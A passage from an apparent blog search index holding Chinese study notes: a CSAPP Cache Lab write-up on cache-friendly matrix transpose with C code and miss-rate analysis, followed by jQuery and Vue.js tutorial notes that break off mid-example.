((int)pow(2, s + b));    //计算标记位\n        int s_address = address / ((int)pow(2, b)) % (int)(pow(2, s));    //计算索引位\n        if (identifier == 'M')    //M模式两次solve\n        {\n            Solve(t_address, s_address);\n            Solve(t_address, s_address);\n        }\n        else    //S模式或L模式\n            Solve(t_address, s_address);\n    }\n    //结束\n    free(cache);\n    free(cache_index);    //释放内存\n    fclose(pFile);    //关闭文件\n    printSummary(hit_count, miss_count, eviction_count);    //输出\n    return 0;\n}\n```\n\n## **PhaseB**\n### 实验要求\n- 优化转置矩阵的代码，使其未命中率尽可能低\n- 矩阵大小分别为32\\*32,64\\*64和61\\*67，由于不同矩阵大小的代码可能不同，所以所写代码只对测试的三组数据进行优化\n- 从老师所给的PPT和pdf中可以知道对矩阵分组（blocking）可以有效地提升缓存命中率\n\n> 前提：从导出的trans.f0文件中可以得知，使用./test-trans命令测试得出的未命中数量比实际的多3（valgrind模拟额外开销）\n> 以下提及的所有未命中均为实际未命中数量，如需转换到命令输出需加3\n\n### 32\\*32（理论最优256）\n#### 基准测试\n- 经过测试，文件自带转置函数对于32\\*32矩阵转置未命中为1180\n##### 命中率分析\n- **A：（156未命中，15.23%未命中率）**\n![1](https://d-sketon.top/img/csapp-cachelab/1.png){width=\"500\"}\n- **B：（1024未命中，100%未命中率）**\n![2](https://d-sketon.top/img/csapp-cachelab/2.png){width=\"500\"}\n- 在A矩阵遍历每一行时，B中每一列的每个元素每隔8行都会发生冲突不命中，如此造成低命中率\n#### 第一次优化\n- 由于是每隔8行发生不命中，所以首先考虑8\\*8矩阵分块。注意到每个缓存块中正好能存放8个整型，且每个分块除对角线互不干扰（不会发生驱逐），如此一来按块进行转置，每个块中不会发生大量的冲突不命中，且块与块之间绝对不会发生冲突。所以8\\*8分块是可行的\n- 代码\n![4](https://d-sketon.top/img/csapp-cachelab/4.png)\n- 经过测试，8\\*8对于32\\*32矩阵转置未命中为340\n![3](https://d-sketon.top/img/csapp-cachelab/3.png)\n##### 命中率分析\n- **A：（156未命中，15.23%未命中率）**\n![5](https://d-sketon.top/img/csapp-cachelab/5.png){width=\"500\"}\n- **B：（184未命中17.97%未命中率）**\n![6](https://d-sketon.top/img/csapp-cachelab/6.png){width=\"500\"}\n- A没有发生变化而B命中率大大提高，但总未命中数仍然超过300\n#### 第二次优化\n- 注意到A矩阵中元素仍然会和B矩阵中元素互相冲突，导致A矩阵的对角线和B矩阵对角线上一格元素发生冲突不命中，具体解释如图所示：\n![7](https://d-sketon.top/img/csapp-cachelab/7.png){width=\"500\"}\n- 大部分冲突命中均发生在A和B的相邻操作中（红色画圈部分），所以可以考虑先同时对A块中的同一行进行读取操作，再同时对B块对应列进行写入操作，这样便可以消除相邻操作带来的冲突不命中\n- 替换内部循环代码为：\n![8](https://d-sketon.top/img/csapp-cachelab/8.png)\n- 经过测试，8\\*8对于32\\*32矩阵转置未命中为284，已达到满分标准\n![9](https://d-sketon.top/img/csapp-cachelab/9.png)\n##### 命中率分析\n- **A：（128未命中，12.5%未命中率）**\n![10](https://d-sketon.top/img/csapp-cachelab/10.png){width=\"500\"}\n- **B：（156未命中，15.23%未命中率）**\n![11](https://d-sketon.top/img/csapp-cachelab/11.png){width=\"500\"}\n### 64\\*64（理论最优1024）\n#### 基准测试\n- 相比于32\\*32矩阵缓存能存放8行元素，64\\*64矩阵缓存只能存放4行元素\n- 首先尝试和上题一样8\\*8分块并一次性读取一行（代码省略）\n- 经过测试，8\\*8并一次性读取对于64\\*64矩阵转置未命中为4608，几乎没有提升\n![12](https://d-sketon.top/img/csapp-cachelab/12.png)\n- 文件自带转置函数未命中为4720\n![13](https://d-sketon.top/img/csapp-cachelab/13.png)\n##### 命中率分析\n- **A：（512未命中，12.5%未命中率）**\n![14](https://d-sketon.top/img/csapp-cachelab/14.png){width=\"500\"}\n- **B：（4096未命中，100%未命中率）**\n![15](https://d-sketon.top/img/csapp-cachelab/15.png){width=\"500\"}\n- 由于每次对A一次性读取一行，所以A矩阵的命中率得到了提升（12.5%未命中率）\n- 但由于缓存只能存下矩阵前4行元素，B矩阵在读取后4列时会覆盖前4列，同时读取前4列时会覆盖后4列，导致每个元素都发生了冲突不命中（初始为冷不命中）\n![16](https://d-sketon.top/img/csapp-cachelab/16.png){width=\"500\"}\n（红色箭头表示冲突不命中）\n#### 第一次优化\n- 由于前后4列会互相覆盖，所以考虑将8\\*8分块改为4\\*4分块，每次一次性读取一行，这样便能降低B矩阵的未命中率\n- 代码：\n![17](https://d-sketon.top/img/csapp-cachelab/17.png)\n- 经过测试，4\\*4并一次性读取对于64\\*64矩阵转置未命中为1696，有了较大的提升，但依然没有小于1300\n![18](https://d-sketon.top/img/csapp-cachelab/18.png)\n##### 命中率分析\n- **A：（576，14.06%未命中率）**\n![19](https://d-sketon.top/img/csapp-cachelab/19.png){width=\"500\"}\n- **B：（1120，27.34%未命中率）**\n![20](https://d-sketon.top/img/csapp-cachelab/20.png){width=\"500\"}\n- B矩阵由于降低分块大小且仍然一次性读取一行，不再100%未命中率，但由于采用了4\\*4分块，在非对角线块内部仍然会发生大量冲突不命中，未命中率为25%，而在对角线块上由于A矩阵和B矩阵所映射到相同的缓存块，导致A矩阵和B矩阵发生冲突不命中，未命中率更高\n![21](https://d-sketon.top/img/csapp-cachelab/21.png)\n（非对角线块）\n- 由此可见单纯的4\\*4分块已经达到了极限，需要更进一步的优化\n#### 第二次优化\n- 由于缓存中能存放8个整型，所以考虑先进行8\\*8分块，而在大块内部再进行4\\*4分块操作\n为了最大化的利用缓存，尽可能低减少冲突，考虑在8\\*8大块内部进行三步操作：\n\n> 这里的思想参考了某位大神，这里着重分析\n> 每个8\\*8块中的4\\*4块按行顺序将块被标记为1,2,3,4块\n\n- 1.首先对A矩阵的1,2块一次性读取一行8个元素，并按列分别移入B矩阵的1块和2块中\n![22](https://d-sketon.top/img/csapp-cachelab/22.png){width=\"500\"}\n- 2.对A矩阵的3块按列读取，对B矩阵的2块按行读取，将读取到的A矩阵按行移入B矩阵的2块，将读取到的B矩阵按行移入B矩阵的3块（两次读取后直接进行移入）\n![23](https://d-sketon.top/img/csapp-cachelab/23.png){width=\"500\"}\n- 3.对A矩阵的4块一次性读取两行，并按列移入B矩阵的4块中\n![24](https://d-sketon.top/img/csapp-cachelab/24.png){width=\"500\"}\n- 代码：\n![25](https://d-sketon.top/img/csapp-cachelab/25.png)\n- 经过测试，该方法对于64\\*64矩阵转置未命中为1160，已达到满分标准\n![26](https://d-sketon.top/img/csapp-cachelab/26.png)\n##### 命中率分析\n- **A：（552，13.48%未命中率）**\n![34](https://d-sketon.top/img/csapp-cachelab/34.png){width=\"500\"}\n- **B：（608，14.84%未命中率）**\n![35](https://d-sketon.top/img/csapp-cachelab/35.png){width=\"500\"}\n- 对于对角块：\n    - 第一步对A矩阵的1,2块一次性读取一行8个元素，A矩阵的1,2块的未命中率降低为12.5%（本来为25%），由于充分使用了缓存块，提升了A矩阵命中率\n    - 对于B矩阵按列移入1,2块，在首次写入1块的第一列时冷不命中，同时缓存被写入相对应行中元素，所以2块所有元素在这一步中会全部命中，而仅仅会在1块的对角线上发生冲突不命中\n    - 第二步先对A矩阵的3块按列读取，对B矩阵的2块按行读取\n    - A矩阵首次读取3块第一列发生冲突不命中，而在之后的的读取中对角线上元素会和B矩阵发生冲突不命中，而对于B矩阵，由于按行进行读取，所以冲突不命中仅仅发生在2块的第一列上\n    - 将读取到的A矩阵按行移入B矩阵的2块，将读取到的B矩阵按行移入B矩阵的3块（注意行列顺序）\n    - 由于之前在读取时已按行将B矩阵存入缓存中，所以B矩阵2块上会全部命中，而仅仅在移入3块时在每一列上发生冲突不命中\n    - 第三步对A矩阵的4块一次性读取两行，并按列移入B矩阵的4块中\n    - 和之前4\\*4分块类似，但选择一次性读入两行相比于一次性读取一行能小幅提升命中率\n- 对于非对角块：\n    - 三步操作都仅仅会在4个小块的第一列上发生冲突不命中，未命中率均为12.5%，对于B矩阵来说命中率大大提升\n### 61\\*67\n- 由于61和67都是素数，无法被8整除，所以在缓存中会发生错位现象，如图所示\n![27](https://d-sketon.top/img/csapp-cachelab/27.png){width=\"500\"}\n（A矩阵67\\*61部分缓存映射关系）\n- 矩阵不是正方形，A矩阵和B矩阵的行数和列数并不相等，所以直接分析相比于之前会非常困难，且效率也不高，所以本情况不再详细分析\n- 由于冲突不命中的概率相比于64\\*64会下降，所以块的大小可以适当加大，此外对于不能分块的区域需要分开处理\n#### 第一次优化\n- 首先考虑和64\\*64矩阵一样的转置方法：\n将61\\*67的56\\*64部分采用和之前一样的方法，而对于剩下的部分采用最原始的直接转置法：\n![28](https://d-sketon.top/img/csapp-cachelab/28.png)\n- 经测试，未命中为2058，已经非常接近2000：\n![29](https://d-sketon.top/img/csapp-cachelab/29.png)\n- 剩下的矩阵考虑分成3大部分：\n- 第一部分（A\\[64]\\[0]~A\\[67]\\[59]）\n- 分成3\\*6的块，每次一次性读取一行进行转置\n- 第二部分（A\\[0]\\[56]~A\\[63]\\[59]）\n- 一次性读取一行进行转置\n- 第三部分（A\\[64]\\[60]~A\\[66]\\[60]）\n- 直接转置\n- 剩下部分的代码：（不完整）\n![30](https://d-sketon.top/img/csapp-cachelab/30.png)\n- 经测试，未命中为1971，已达到了满分标准，但还有优化空间\n![31](https://d-sketon.top/img/csapp-cachelab/31.png)\n#### 第二次优化\n- 经过测试，发现存在更优解：\n- 将61\\*67的60\\*60部分分成20\\*4的块，每次一次性读取两行\n- 剩下的矩阵考虑分成2大部分：\n- 第一部分（A\\[0]\\[60]~A\\[66]\\[60]）\n- 直接转置\n- 第二部分（A\\[60]\\[0]~A\\[66]\\[59]）\n- 一次性读取一列进行转置（非按行读取）\n- 代码：\n![32](https://d-sketon.top/img/csapp-cachelab/32.png)\n- 经测试，未命中为1750，有了较大幅度的优化，同时代码复杂度也大大下降\n![33](https://d-sketon.top/img/csapp-cachelab/33.png)\n### 完整代码\n```c\nvoid transpose_submit(int M, int N, int A[N][M], int B[M][N])\n{\n    int i, j, ii;\n    int x0, x1, x2, x3, x4, x5, x6, x7;\n    if (M == 32) //32x32矩阵\n    {\n        for (i = 0; i < 32; i += 8) \n            for (j = 0; j < 32; j += 8)     //8x8分块\n                for (ii = i; ii < i + 8; ii++)\n                {\n                    x0 = A[ii][j];      x1 = A[ii][j + 1];\n                    x2 = A[ii][j + 2];  x3 = A[ii][j + 3];\n                    x4 = A[ii][j + 4];  x5 = A[ii][j + 5];\n                    x6 = A[ii][j + 6];  x7 = A[ii][j + 7];  //每次一次性读取一行，存入x0~x7\n                    B[j][ii] = x0;      B[j + 1][ii] = x1;\n                    B[j + 2][ii] = x2;  B[j + 3][ii] = x3;\n                    B[j + 4][ii] = x4;  B[j + 5][ii] = x5;\n                    B[j + 6][ii] = x6;  B[j + 7][ii] = x7;  //移入B矩阵\n                }\n    }\n    else if (M == 64) //64x64矩阵\n    {\n        for (i = 0; i < 64; i += 8)\n            for (j = 0; j < 64; j += 8) //先8x8分块\n            {\n                //8x8大块中进行3步操作\n                for (ii = i; ii < i + 4; ii++)  //A矩阵的1,2块\n                {\n                    x0 = A[ii][j];      x1 = A[ii][j + 1];\n                    x2 = A[ii][j + 2];  x3 = A[ii][j + 3];\n                    x4 = A[ii][j + 4];  x5 = A[ii][j + 5];\n                    x6 = A[ii][j + 6];  x7 = A[ii][j + 7];  //一次性读取一行，存入x0~x7\n                    B[j][ii] = x0;      B[j + 1][ii] = x1;\n                    B[j + 2][ii] = x2;  B[j + 3][ii] = x3;  //按列移入B矩阵1块\n                    B[j][ii + 4] = x4;  B[j + 1][ii + 4] = x5;\n                    B[j + 2][ii + 4] = x6;  B[j + 3][ii + 4] = x7;  //按列移入B矩阵2块\n                }\n                for (ii = j; ii < j + 4; ii++)  //A矩阵的3块和B矩阵的2块\n                {\n                    x0 = A[i + 4][ii];  x1 = A[i + 5][ii];\n                    x2 = A[i + 6][ii];  x3 = A[i + 7][ii];  //按列读取A矩阵3块\n                    x4 = B[ii][i + 4];  x5 = B[ii][i + 5];\n                    x6 = B[ii][i + 6];  x7 = B[ii][i + 7];  //按行读取B矩阵2块\n                    B[ii][i + 4] = x0;  B[ii][i + 5] = x1;\n                    B[ii][i + 6] = x2;  B[ii][i + 7] = x3;  //按行移入B矩阵2块\n                    B[ii + 4][i] = x4;  B[ii + 4][i + 1] = x5;\n                    B[ii + 4][i + 2] = x6;  B[ii + 4][i + 3] = x7;  //按行移入B矩阵3块\n                }\n                for (ii = i + 4; ii < i + 8; ii += 2)   //A矩阵的4块\n                {\n                    x0 = A[ii][j + 4];      x1 = A[ii][j + 5];\n                    x2 = A[ii][j + 6];      x3 = A[ii][j + 7];\n                    x4 = A[ii + 1][j + 4];  x5 = A[ii + 1][j + 5];\n                    x6 = A[ii + 1][j + 6];  x7 = A[ii + 1][j + 7];  //一次性读取两行，存入x0~x7\n                    B[j + 4][ii] = x0;      B[j + 5][ii] = x1;\n                    B[j + 6][ii] = x2;      B[j + 7][ii] = x3;\n                    B[j + 4][ii + 1] = x4;  B[j + 5][ii + 1] = x5;\n                    B[j + 6][ii + 1] = x6;  B[j + 7][ii + 1] = x7;  //移入B矩阵\n                }\n            }\n    }\n    else //61x67矩阵\n    {\n        //以下为1750miss方法\n        for (i = 0; i < 60; i += 20)\n            for (j = 0; j < 60; j += 4) //60x60部分进行20x4分块\n                for (ii = i; ii < i + 20; ii += 2)  \n                {\n                    x0 = A[ii][j];          x1 = A[ii][j + 1];\n                    x2 = A[ii][j + 2];      x3 = A[ii][j + 3];\n                    x4 = A[ii + 1][j];      x5 = A[ii + 1][j + 1];\n                    x6 = A[ii + 1][j + 2];  x7 = A[ii + 1][j + 3];  //一次性读取两行，存入x0~x7\n                    B[j][ii] = x0;          B[j + 1][ii] = x1;\n                    B[j + 2][ii] = x2;      B[j + 3][ii] = x3;\n                    B[j][ii + 1] = x4;      B[j + 1][ii + 1] = x5;\n                    B[j + 2][ii + 1] = x6;  B[j + 3][ii + 1] = x7;  //移入B矩阵\n                }\n        for (i = 0; i < 67; i++)    //A[0][60]~A[66][60]部分直接转置\n            B[60][i] = A[i][60];    \n        for (i = 0; i < 60; i++)    //A[60][0]~A[66][59]部分\n        {\n            x0=A[60][i];    x1=A[61][i];\n            x2=A[62][i];    x3=A[63][i];\n            x4=A[64][i];    x5=A[65][i];\n            x6=A[66][i];    //一次性读取一列，存入x0~x6\n            B[i][60]=x0;    B[i][61]=x1;\n            B[i][62]=x2;    B[i][63]=x3;\n            B[i][64]=x4;    B[i][65]=x5;\n            B[i][66]=x6;    //移入B矩阵\n        }\n        /*\n        //以下为1971miss方法\n        for (i = 0; i < 64; i += 8)\n            for (j = 0; j < 56; j += 8) //64x56部分进行8x8分块\n            {\n                for (ii = i; ii < i + 4; ii++)  //以下方法同64x64\n                {\n                    x0 = A[ii][j];      x1 = A[ii][j + 1];\n                    x2 = A[ii][j + 2];  x3 = A[ii][j + 3];\n                    x4 = A[ii][j + 4];  x5 = A[ii][j + 5];\n                    x6 = A[ii][j + 6];  x7 = A[ii][j + 7];\n                    B[j][ii] = x0;      B[j + 1][ii] = x1;\n                    B[j + 2][ii] = x2;  B[j + 3][ii] = x3;\n                    B[j][ii + 4] = x4;  B[j + 1][ii + 4] = x5;\n                    B[j + 2][ii + 4] = x6;  B[j + 3][ii + 4] = x7;\n                }\n                for (ii = j; ii < j + 4; ii++)\n                {\n                    x0 = A[i + 4][ii];  x1 = A[i + 5][ii];\n                    x2 = A[i + 6][ii];  x3 = A[i + 7][ii];\n                    x4 = B[ii][i + 4];  x5 = B[ii][i + 5];\n                    x6 = B[ii][i + 6];  x7 = B[ii][i + 7];\n                    B[ii][i + 4] = x0;  B[ii][i + 5] = x1;\n                    B[ii][i + 6] = x2;  B[ii][i + 7] = x3;\n                    B[ii + 4][i] = x4;  B[ii + 4][i + 1] = x5;\n                    B[ii + 4][i + 2] = x6;  B[ii + 4][i + 3] = x7;\n                }\n                for (ii = i + 4; ii < i + 8; ii += 2)\n                {\n                    x0 = A[ii][j + 4];      x1 = A[ii][j + 5];\n                    x2 = A[ii][j + 6];      x3 = A[ii][j + 7];\n                    x4 = A[ii + 1][j + 4];  x5 = A[ii + 1][j + 5];\n                    x6 = A[ii + 1][j + 6];  x7 = A[ii + 1][j + 7];\n                    B[j + 4][ii] = x0;      B[j + 5][ii] = x1;\n                    B[j + 6][ii] = x2;      B[j + 7][ii] = x3;\n                    B[j + 4][ii + 1] = x4;  B[j + 5][ii + 1] = x5;\n                    B[j + 6][ii + 1] = x6;  B[j + 7][ii + 1] = x7;\n                }\n            }   \n        for (j = 0; j < 60; j += 6)\n            for (ii = 64; ii < 67; ii++)    //A[64][0]~A[67][59]部分进行3x6分块\n            {\n                x0 = A[ii][j];      x1 = A[ii][j + 1];\n                x2 = A[ii][j + 2];  x3 = A[ii][j + 3];\n                x4 = A[ii][j + 4];  x5 = A[ii][j + 5];  //一次性读取一行\n                B[j][ii] = x0;      B[j + 1][ii] = x1;\n                B[j + 2][ii] = x2;  B[j + 3][ii] = x3;\n                B[j + 4][ii] = x4;  B[j + 5][ii] = x5;\n            }\n        for (i = 0; i < 64; i ++)   //A[0][56]~A[63][59]部分\n        {\n            x0 = A[i][56]; x1 = A[i][57];\n            x2 = A[i][58]; x3 = A[i][59];   //一次性读取一行\n            x4 = A[i][60]; B[56][i] = x0;\n            B[57][i] = x1; B[58][i] = x2;\n            B[59][i] = x3; B[60][i] = x4;\n        }     \n        B[60][64] = A[64][60];  //剩余直接转置\n        B[60][65] = A[65][60];\n        B[60][66] = A[66][60];\n        */\n    }\n}\n```","tags":["CSAPP","深入理解计算机系统"],"categories":["计软杂谈"]},{"title":"jQuery学习笔记","url":"/reimu-lighthouse/20211009/jquery-note/","content":"## **jQuery语法**\n- 基本语法：`$(selector).action()`\n- `$`符号：定义 jQuery\n- `(selector)` ：查找HTML 元素\n- `action()` ：对元素进行操作\n- 入口函数\n```js\n$(document).ready(function(){\n//...\n});\n\n//可简写为\n$(function(){\n//...\n};\n```\n\n## **jQuery选择器**\n- 元素选择器\n    - `$(\"p\")` 选取 \\<p> 元素\n    - `$(\"p.intro\")` 选取所有 class=\"intro\" 的 \\<p> 元素\n    - `$(\"p#demo\")` 选取所有 id=\"demo\" 的 \\<p> 元素\n- 属性选择器\n    - `$(\"[attri]\")` 选取所有含有 attri 属性的元素\n    - `$(\"[attri='value']\")` 选取所有含有 attri 值等于 \"value\" 的元素\n    - `$(\"[attri!='value']\")` 选取所有含有 attri 值不等于 \"value\" 的元素\n    - `$(\"[attri^='value']\")` 选取所有 attri 值以 \"value\" 开头的元素\n    - `$(\"[attri$='value']\")` 选取所有 attri 值以 \"value\" 结尾的元素\n    - `$(\"[attri*='value']\")` 选取所有 attri 值包含 \"value\" 的元素\n\n## **jQuery效果**\n### 隐藏和显示\n- `hide()`  隐藏\n- `show()`  显示\n- `toogle()`  hide和show切换\n```js\n$(selector).hide([duration],[complete]);\n\n$(selector).show([duration],[complete]);\n\n$(selector).toggle([duration],[complete]);\n```\n- duration 规定动画速度，默认400ms\n- complete 规定回调函数\n### 淡入淡出\n- `fadeIn()`  淡入已隐藏的元素\n- `fadeOut()`  淡出可见元素\n- `fadeToggle()`  fadeIn和fadeOut切换\n- `fadeTo()`  渐变为给定的不透明度\n```js\n$(selector).fadeIn([duration],[complete]);\n\n$(selector).fadeOut([duration],[complete]);\n\n$(selector).fadeToggle([duration],[complete]);\n\n$(selector).fadeTo(duration,opacity,[complete]);\n```\n- duration 规定动画速度\n- complete 规定回调函数\n### 滑动\n- `slideDown()`  向下滑动\n- `slideUp()`  向上滑动\n- `slideToggle()`  slideDown和slideup切换\n```js\n$(selector).slideDown([duration],[complete]);\n\n$(selector).slideUp([duration],[complete]);\n\n$(selector).slideToggle([duration],[complete]);\n```\n- duration 规定动画速度\n- complete 规定回调函数\n### 动画\n- `animate()`  设置CSS动画\n```js\n$(selector).animate(properties,[duration],[easing],[complete]);\n\n//例子\n$(\"button\").click(function(){\n  $(\"div\").animate({\n    left:'250px',\n    opacity:'0.5',\n  },1000);\n}); \n```\n- properties 定义形成动画的CSS属性，多个属性用对象表示\n- duration 规定动画速度\n- easing 规定缓动函数\n- complete 规定回调函数\n\n> 注意jQuery允许链式编程\n> ```js\n> $(\"#p1\").css(\"color\",\"red\").slideUp(2000).slideDown(2000);\n> ```\n\n\n## **jQuery HTML**\n### 获取&&设置\n- `text()`  设置或返回所选元素的文本内容\n- `html()`  设置或返回所选元素的内容（包括 HTML 标记）\n- `val()`  设置或返回表单字段的值\n- `attr()`  设置或返回所选元素的属性\n```js\n$(selector).text(content);\n\n$(selector).html(html);\n\n$(selector).val(value);\n\n$(selector).attr(attributeName,value);\n```\n\n> 注意text()、html() 以及 val()拥有回调函数，回调函数的两个参数为被选元素列表中当前元素的下标，以及原始值，函数返回值为新值\n> ```js\n> $(\"#test\").text(function(i,origText){\n>   return \"Old text: \" + origText + \" New text: Hello world!\n>   (index: \" + i + \")\";\n> });\n> ```\n\n### 添加\n- `append()` 在被选元素的结尾插入内容\n- `prepend()` 在被选元素的开头插入内容\n- `after()` 在被选元素之后插入内容\n- `before()` 在被选元素之前插入内容\n```js\n$(selector).append(content,[content]);\n\n$(selector).prepend(content,[content]);\n\n$(selector).after(content,[content]);\n\n$(selector).before(content,[content]);\n```\n### 删除\n- `remove()` 删除被选元素（及子元素）\n- `empty()` 从被选元素中删除子元素\n```js\n$(selector).remove();\n\n$(selector).empty()\n```\n- 可以对元素进行过滤删除\n```js\n//删除class=\"del\"的所有<p>元素\n$(\"p\").remove(\".del\");\n```\n###  获取并设置 CSS\n- `addClass()`  向被选元素添加一个或多个类\n- `removeClass()`  从被选元素删除一个或多个类\n- `toggleClass()`  addClass和removeClass切换\n- `css()`  设置或返回样式属性\n```js\n$(selector).addClass(className(s));\n\n$(selector).removeClass(className(s));\n\n$(selector).toggleClass(className(s));\n\n//返回样式属性\n$(selector).css(propertyName(s));\n\n//设置样式属性\n$(selector).css(propertyName,value);\n```\n- 如需设置多个样式属性，需要写成对象形式\n```js\n$(selector).css({\"propertyName\":\"value\",\"propertyName\":\"value\",...});\n```\n## **jQuery遍历**\n### DOM向上遍历\n- `parent()`  返回被选元素的直接父元素\n- `parents()`  返回被选元素的所有祖先元素\n- `parentsUntil()` 返回介于两个给定元素之间的所有祖先元素\n```js\n$(selector).parent([filter]);\n\n$(selector).parents([filter]);\n\n$(selector).parentsUntil([selector],[filter]);\n```\n- selector  给定元素，确定查找范围（对于parentsUntil）\n- filter  元素筛选\n### DOM向下遍历\n- `children()`  返回被选元素的所有**直接**子元素\n- `find()`  返回被选元素的后代元素，一路向下直到最后一个后代\n```js\n$(selector).children([filter]);\n\n$(selector).find(filter);\n\ne,g\n//返回<div>后代的所有<span>元素\n$(\"div\").find(\"span\");\n\n//返回<div>的所有后代\n$(\"div\").find(\"*\");\n```\n- filter  元素筛选\n### DOM水平遍历\n- `siblings()`  返回被选元素的所有同胞元素\n- `next()`  返回被选元素的下一个同胞元素\n- `nextAll()`  返回被选元素的所有跟随的同胞元素\n- `nextUntil()`  返回介于两个给定参数之间的所有跟随的同胞元素\n- `prev()`\n- `prevAll()`\n- `prevUntil()`\n```js\n$(selector).siblings([filter]);\n\n$(selector).next([filter]);\n\n$(selector).nextAll([filter]);\n\n$(selector).nextUntil([selector],[filter]);\n```\n- selector  给定元素，确定查找范围\n- filter  元素筛选\n### 过滤\n- `first()`  返回被选元素的首个元素\n- `last()`  返回被选元素的最后一个元素\n- `eq()`  返回被选元素中带有指定索引号的元素\n```js\n$(selector).first()\n\n$(selector).last()\n\n$(selector).eq(index)\n```\n## **jQuery AJAX**\n### LOAD\n- `load()` 从服务器加载数据，并把返回的数据放入被选元素中\n```js\n$(selector).load(url,[data],[complete])\n```\n- url  加载的 URL\n- data  与请求一同发送的查询字符串键/值对集合\n- complete  回调函数\n### GET&&POST\n- GET  从指定的资源请求数据\n- POST  向指定的资源提交要处理的数据\n- `$.get()`  通过 HTTP GET 请求从服务器上请求数据\n- `$.post()` 通过 HTTP POST 请求从服务器上请求数据\n```js\n$.get(url,complete);\n$.post(url,data,complete);\n```\n- url  加载的 URL\n- data  连同请求发送的数据\n- complete  回调函数","tags":["前端","jQuery"],"categories":["前端","jQuery"]},{"title":"Vue.js学习笔记","url":"/reimu-lighthouse/20211008/vue-note/","content":"## **简介**\n- Vue.js是一套构建用户界面的渐进式框架\n- Vue 只关注视图层， 采用自底向上增量开发的设计\n- Vue 是通过尽可能简单的 API 实现响应的数据绑定和组合的视图组件\n\n## **Vue实例**\n- 每个 Vue 应用都通过实例化 Vue 来实现\n- 变量名vm是受到了MVVM模型的启发\n- el 参数绑定对应DOM元素\n- data 定义属性\n- methods 定义函数\n```js\nvar vm = new Vue({\n    el: '#app',\n    data: {\n        msg: 'test'\n    },\n    methods: {\n        handle() {\n            alert(\"alert\")\n        }\n    }\n})\n```\n\n## **插值**\n#### 文本插值\n- {% raw %}{{...}}{% endraw %}（双大括号）\n```html\n<span>Message: {% raw %}{{ msg }}{% endraw %}</span>\n```\n- v-text 指令，用于文本插值\n```html\n<p v-text=\"msg\"><p>\n```\n\n```js\ndata: {\n    msg: 'hello'\n}\n```\n\n> v-text会覆盖元素中原本的内容，{% raw %}{{...}}{% endraw %}只会替换自己的这个占位符，不会把整个元素内容替换\n\n#### HTML插值\n- v-html 指令，用于HTML插值\n```html\n<span v-html=\"rawhtml\"></span>\n```\n```js\ndata: {\n    rawhtml: '<p>hello</p>'\n}\n```\n#### 属性\n- v-bind 指令，用于属性绑定\n```html\n<button v-bind:disabled=\"isButtonDisabled\">Button</button>\n```\n```js\ndata: {\n    isButtonDisabled: true\n}\n```\n- v-bind 缩写\n```html\n<button :disabled=\"isButtonDisabled\">Button</button>\n```\n#### JS表达式\n- 对于所有的数据绑定，Vue.js 都提供了完全的 JavaScript 表达式支持\n```html\n{% raw %}{{number + 1}}{% endraw %}\n\n{% raw %}{{ok ? 'YES' : 'NO'}}{% endraw %}\n\n{% raw %}{{message.split('').reverse().join('')}}{% endraw %}\n```\n\n> 注意JS表达式和JS语句的区别\n\n\n## **指令**\n- v-bind 指令，如前文所示\n- v-on 指令，用于监听 DOM 事件\n```html\n<a v-on:click=\"doSomething\">...</a>\n```\n```js\nmethods: {\n    doSomething() {\n        alert(\"alert\")\n    }\n}\n```\n- v-on 缩写\n```html\n<a @click=\"doSomething\">...</a>\n```\n- v-model 指令，用于在表单\\<input\\>、\\<textarea\\> 及 \\<select\\> 元素上实现双向数据绑定\n```html\n<input v-model=\"message\" placeholder=\"edit me\">\n<p>Message is: {% raw %}{{ message }}{% endraw %}</p>\n```\n- v-if 指令，用于条件渲染\n```html\n<h1 v-if=\"awesome\">Vue is awesome!</h1>\n```\n```js\ndata: {\n    awesome: true\n}\n```\n- v-else指令，用于表示 v-if 的“else 块”\n```html\n<div v-if=\"Math.random() > 0.5\">\n  Now you see me\n</div>\n<div v-else>\n  Now you don't\n</div>\n```\n- v-show 指令，用于条件渲染\n```html\n<h1 v-show=\"ok\">Hello!</h1>\n```\n\n> v-if和v-show的区别：\n> 带有 v-show 的元素始终会被渲染并保留在 DOM 中。v-show 只是简单地切换元素的display样式\n> 如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好\n\n- v-for 指令，用于列表渲染\n- v-for 指令需要使用 item in items 形式的特殊语法，其中 items 是源数据数组，而 item 则是被迭代的数组元素的别名\n```html\n<ul id=\"example-1\">\n    <li v-for=\"item in items\">\n        {% raw %}{{ item.message }}{% endraw %}\n    </li>\n</ul>\n```\n```js\nnew Vue({\n    el: '#example-1',\n    data: {\n        items: [\n            { message: 'Foo' },\n            { message: 'Bar' }\n        ]\n    }\n})\n```\n- v-for也可以遍历一个对象的 property\n\n## **计算属性和侦听器**\n### 计算属性\n- 计算属性，通过computed来实现复杂逻辑运算\n- 计算属性是基于它们的响应式依赖进行缓存的。只在相关响应式依赖发生改变时它们才会重新求值\n```html\n<div id=\"example\">\n  <p>Original message: \"{% raw %}{{ message }}{% endraw %}\"</p>\n  <p>Computed reversed message: \"{% raw %}{{ reversedMessage }}{% endraw %}\"</p>\n</div>\n```\n```js\nnew Vue({\n  el: '#example',\n  data: {\n    message: 'Hello'\n  },\n  computed: {\n    // 计算属性的 getter\n    reversedMessage: function () {\n      // this 指向 vm 实例\n      return this.message.split('').reverse().join('')\n    }\n  }\n})\n```\n- 计算属性可以拥有setter\n```js\ncomputed: {\n  fullName: {\n    // getter\n    get: function () {\n      return this.firstName + ' ' + this.lastName\n    },\n    // setter\n    set: function (newValue) {\n      var names = newValue.split(' ')\n      this.firstName = names[0]\n      this.lastName = names[names.length - 1]\n    }\n  }\n}\n```\n### 侦听器\n- 侦听属性,通过 watch 来响应数据的变化\n```html\n<div id=\"demo\">{% raw %}{{ fullName }}{% endraw %}</div>\n```\n```js\nnew Vue({\n  el: '#demo',\n  data: {\n    firstName: 'Foo',\n    lastName: 'Bar',\n    fullName: 'Foo Bar'\n  },\n  watch: {\n    firstName: function (val) {\n      this.fullName = val + ' ' + this.lastName\n    },\n    lastName: function (val) {\n      this.fullName = this.firstName + ' ' + val\n    }\n  }\n})\n```\n\n## **事件修饰符**\n- .stop 阻止事件冒泡到父元素\n- .prevent 阻止元素发生默认的行为\n- .capture 内部元素触发的事件先在此处理，然后才交由内部元素进行处理\n- .self 忽略事件冒泡和事件捕获对本元素的影响\n- .once 事件将只会触发一次\n- .passive\n```html\n<!-- 阻止单击事件继续传播 -->\n<a v-on:click.stop=\"doThis\"></a>\n\n<!-- 提交事件不再重载页面 -->\n<form v-on:submit.prevent=\"onSubmit\"></form>\n\n<!-- 修饰符可以串联 